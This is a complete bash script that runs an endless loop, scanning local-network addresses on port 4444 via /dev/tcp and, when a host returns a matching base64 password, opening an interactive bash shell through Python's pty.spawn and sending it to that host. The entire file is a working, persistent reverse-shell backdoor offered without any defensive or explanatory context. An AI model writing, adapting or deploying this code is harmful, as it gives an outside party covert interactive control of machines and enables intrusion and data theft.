#!/usr/bin/env bash

ip='192.168.1'
port='4444'
pass='d29tYm8='

shell() {
for i in $(seq 100 255 | shuf); do
  com="${ip}.${i}"
 (
if received_pass=$(timeout 0.2 bash -c "exec 3<>/dev/tcp/$com/$port; head -n 1 <&3; exec 3>&-" 2>/dev/null); then
   
   if [ "$received_pass" == "$pass" ]; then
      if ! pgrep -f "pty.spawn" > /dev/null; then
         sleep 2.5
         python3 -c '
import pty, os, select, sys
os.environ["TERM"]="xterm"
def sync_io(master_fd):
    while True:
        # 180 second inactivity timeout
        r, w, e = select.select([master_fd, sys.stdin], [], [], 180)
        if not r: break
        if master_fd in r:
            data = os.read(master_fd, 10240)
            if not data: break
            os.write(sys.stdout.fileno(), data)
        if sys.stdin in r:
            data = os.read(sys.stdin.fileno(), 10240)
            if not data: break
            os.write(master_fd, data)
pty.spawn(["/bin/bash", "-i"], sync_io)' >& /dev/tcp/$com/$port 0>&1
      fi
   fi
fi
 ) &
 sleep 0.1
done
wait
}

while true; do
  sleep 15
  shell
  sleep 15
done
